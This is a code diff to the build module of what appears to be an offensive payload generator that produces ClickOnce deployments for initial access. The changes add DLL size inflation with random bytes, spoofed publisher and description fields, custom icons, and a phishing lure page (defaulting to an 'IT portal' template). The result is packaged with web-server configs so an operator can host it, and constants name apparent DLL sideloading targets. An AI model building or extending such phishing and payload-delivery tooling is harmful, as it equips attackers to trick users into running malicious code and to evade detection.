@@ -16,7 +16,12 @@ from .logging import PerRequestLogger, GlobalLogger
 from .hasher import get_api_hash
 from .misc import run_cmd_check_file
 from .mutator import Mutator
-from .consts import *
+from .consts import (
+    BUILD_DIR, SRC_TEMPLATE_DIR, BIN_TEMPLATE_DIR,
+    WEBSERVER_CONFIG_DIR, PHISH_TEMPLATE_DIR, ALLOWED_PHISH_TEMPLATES,
+    SIDELOAD_OPTIONS, BUILD_CMD, DATA_CS_SIZE_IN_MB,
+    TZSYNC, PERFWATSON, SVCHUB, POWERSHELL,
+)
 
 class Builder:
     def __init__(self, buildid: str, payload: CFCOPayload):
@@ -49,9 +54,14 @@ class Builder:
 
     def copy_template_files(self):
         """Copy template files to temporary directory"""
-        # Copy source files
         shutil.copytree(SRC_TEMPLATE_DIR, self.temp_dir, dirs_exist_ok=True)
         self.logger.debug("Copied template files from %s to %s", SRC_TEMPLATE_DIR, self.temp_dir)
+        # Replace template icon if a custom one was supplied
+        if self.payload.icon:
+            icon_path = os.path.join(self.temp_dir, "icon.ico")
+            with open(icon_path, "wb") as f:
+                f.write(b64decode(self.payload.icon))
+            self.logger.debug("Replaced icon.ico with custom upload")
 
     def template_files(self):
         """Generate random keys"""
@@ -117,7 +127,7 @@ class Builder:
                 }""".replace("REPLACEFUNCNAME", ''.join(random.choices(string.ascii_letters, k=16)))
             f.write(template_1)
 
-            # the compiler crashes on greater file sizes, for greater inflations, use a training.data file
+            # Cap Data.cs at DATA_CS_SIZE_IN_MB; remaining inflation is done post-compile in inflate_artefact()
             data_cs_size = self.payload.inflate if self.payload.inflate <= DATA_CS_SIZE_IN_MB else DATA_CS_SIZE_IN_MB
             self.logger.debug("Creating Data.cs to inflate payloads by an extra %d MBs", data_cs_size)
             data_cs_size = data_cs_size * 1024 * 1024
@@ -128,21 +138,55 @@ class Builder:
             f.write(template_2)
             self.logger.debug("Generated Data.cs with size: %ld", os.stat(data_cs_file).st_size)
 
-            # Create training.data file
-            training_data_file = os.path.join(self.temp_dir, "training.data")
-            training_data_size = 1 if self.payload.inflate <= DATA_CS_SIZE_IN_MB else (self.payload.inflate - DATA_CS_SIZE_IN_MB)*1024*1024
-            with open(training_data_file, 'wb') as f:
-                f.write(os.urandom(training_data_size))
-                self.logger.debug(f"Created training.data file with size: %ld", training_data_size)
-
     def compile_artefacts(self):
         """Compile artefacts"""
-        
+
         self.logger.debug("Building artefacts with: %s", BUILD_CMD)
         curr_dir = os.getcwd()
         os.chdir(self.temp_dir)
         run_cmd_check_file(BUILD_CMD, self.tgt_dll, self.logger)
         os.chdir(curr_dir)
+
+    def generate_phish_page(self):
+        """Write index.html lure page from selected phish template.
+        {{provider_url}} is substituted with the relative ClickOnce path."""
+        template_name = self.payload.phish_template
+        if template_name not in ALLOWED_PHISH_TEMPLATES:
+            self.logger.warning("Unknown phish template '%s', falling back to it_portal", template_name)
+            template_name = "it_portal"
+        template_path = os.path.join(PHISH_TEMPLATE_DIR, f"{template_name}.html")
+        try:
+            with open(template_path, "r", encoding="utf-8") as f:
+                html = f.read()
+        except FileNotFoundError:
+            self.logger.warning("Phish template not found: %s, using fallback", template_path)
+            fallback = os.path.join(PHISH_TEMPLATE_DIR, "it_portal.html")
+            try:
+                with open(fallback, "r", encoding="utf-8") as f:
+                    html = f.read()
+            except FileNotFoundError as exc:
+                raise FileNotFoundError(
+                    f"Primary phish template '{template_name}' and fallback 'it_portal' both missing"
+                    f" — check {PHISH_TEMPLATE_DIR} is mounted"
+                ) from exc
+        clickonce_link = f"clickonce/{self.payload.name}.application"
+        html = html.replace("{{provider_url}}", clickonce_link)
+        phish_path = os.path.join(self.build_dir, "index.html")
+        with open(phish_path, "w", encoding="utf-8") as f:
+            f.write(html)
+        self.logger.debug("Wrote index.html using phish template '%s'", template_name)
+
+    def inflate_artefact(self):
+        """Append random bytes to the compiled DLL post-build to reach target inflate size.
+        Appended data is ignored by the PE loader; no compiler memory pressure."""
+        extra_mb = self.payload.inflate - DATA_CS_SIZE_IN_MB
+        if extra_mb <= 0:
+            return
+        self.logger.debug("Post-compile inflating DLL by %d MB", extra_mb)
+        with open(self.tgt_dll, 'ab') as f:
+            for _ in range(extra_mb):
+                f.write(os.urandom(1024 * 1024))
+        self.logger.debug("Post-compile inflation complete; DLL size now %d bytes", os.stat(self.tgt_dll).st_size)
 
     def create_json(self):
         build_json = list()
@@ -264,11 +308,26 @@ class Builder:
                         clickonce_name = self.payload.name,
                         manifest_size = os.stat(
                             os.path.join(self.build_dir, f"{self.payload.name}.manifest")
-                        ).st_size
+                        ).st_size,
+                        publisher = self.payload.publisher,
+                        description = self.payload.description or self.payload.name,
                     )
-                ) 
+                )
 
     def zip_file(self):
+        """Package build artifacts.
+
+        Zip layout:
+          index.html          ← phishing lure page
+          web.config          ┐
+          .htaccess           │ server configs at root so operator drops them
+          nginx-mime.conf     │ into the web root alongside index.html
+          Caddyfile-mime      ┘
+          clickonce/          ← all ClickOnce files in a subdirectory
+            *.application
+            *.manifest
+            *.deploy
+        """
         target_extensions = ('.deploy', '.manifest', '.application')
         source_path = Path(self.build_dir)
 
@@ -278,54 +337,63 @@ class Builder:
 
         if not matching_files:
             raise Exception("No files to zip found")
-        
-        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
-        zip_path = Path(output_zip)
-        with zipfile.ZipFile(zip_path, 'w', zipfile.ZIP_DEFLATED) as zipf:
-            for file_path in matching_files:
-                if file_path.is_file():  # Ensure it's a file, not a directory
-                    # Add file to zip, preserving relative path structure
-                    relative_path = file_path.relative_to(source_path)
-                    zipf.write(file_path, relative_path)
-                    os.remove(file_path)
-                    self.logger.debug(f"Added: {relative_path}")
 
-        self.logger.info(f"Successfully created '{output_zip}' with {len(matching_files)} files")
+        output_zip = os.path.join(self.build_dir, f"{self.payload.name}.zip")
+        with zipfile.ZipFile(Path(output_zip), 'w', zipfile.ZIP_DEFLATED) as zipf:
+            # ClickOnce deployment files → clickonce/ subfolder
+            for file_path in matching_files:
+                if file_path.is_file():
+                    relative_path = file_path.relative_to(source_path)
+                    zipf.write(file_path, os.path.join("clickonce", str(relative_path)))
+                    os.remove(file_path)
+                    self.logger.debug("Added clickonce/%s", relative_path)
+
+            # Phish / lure page → root (remove from build_dir so it doesn't shadow directory listing)
+            index_path = os.path.join(self.build_dir, "index.html")
+            if os.path.isfile(index_path):
+                zipf.write(index_path, "index.html")
+                os.remove(index_path)
+                self.logger.debug("Added index.html")
+
+            # Web server MIME configs → root (operator drops alongside index.html)
+            if os.path.isdir(WEBSERVER_CONFIG_DIR):
+                for fname in os.listdir(WEBSERVER_CONFIG_DIR):
+                    src = os.path.join(WEBSERVER_CONFIG_DIR, fname)
+                    if os.path.isfile(src):
+                        zipf.write(src, fname)
+                        self.logger.debug("Added server config: %s", fname)
+
+        self.logger.info("Created '%s' with %d ClickOnce files", output_zip, len(matching_files))
 
 def build_func(buildid: str, inc_req: CFCOPayload):
     """Build the payload"""
+    builder = None
     try:
-        # Create handler class
         builder = Builder(buildid, inc_req)
+        builder.logger.debug("%s", inc_req)
 
-        builder.logger.debug(f"{inc_req}")
-
-        # Copy template files to build dir
         if not os.path.exists(SRC_TEMPLATE_DIR):
             builder.logger.error("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
-            raise FileNotFoundError("Source Template Directory %s not found", SRC_TEMPLATE_DIR)
-        
-        # Verify incoming payload parameters 
+            raise FileNotFoundError(f"Source Template Directory {SRC_TEMPLATE_DIR} not found")
+
         builder.verify()
-
-        # Copy template files to temp directory
         builder.copy_template_files()
-
-        # Template files
         builder.template_files()
-
-        # Build payload DLL
         builder.compile_artefacts()
-
-        # Create json file
+        builder.inflate_artefact()
         builder.create_json()
-
-        # Put files in build dir
         builder.prepare_files_in_build_dir()
-
-        # Zip files
+        builder.generate_phish_page()
         builder.zip_file()
 
-    except Exception as e:
+        meta_path = os.path.join(builder.build_dir, "build-meta.json")
+        with open(meta_path, "w") as f:
+            json.dump({"type": "cfco", "name": inc_req.name}, f)
+
+        builder.logger.info("Build complete")
+
+    except Exception as e:  # pylint: disable=broad-except
         GlobalLogger.error("Exception occured as %s", e)
         GlobalLogger.error("Traceback: %s", traceback.format_exc())
+        if builder is not None:
+            builder.logger.error("Build failed: %s", e)
